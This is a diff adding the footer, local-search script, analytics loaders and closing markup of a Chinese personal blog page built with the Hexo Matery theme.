+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">10.2k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/f1veseven" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1047865926@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1047865926" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1047865926" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+<!--动态线条背景-->
+<script type="text/javascript"
+color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+
+<!-- 页标题特效 -->
+<script type="text/javascript"> var OriginTitile = document.title, st; 
+document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "Σ(っ °Д °;)っ喔哟，崩溃啦！", clearTimeout(st)) : (document.title = "φ(゜▽゜*)♪咦，又好了！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) }) </script>
+
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
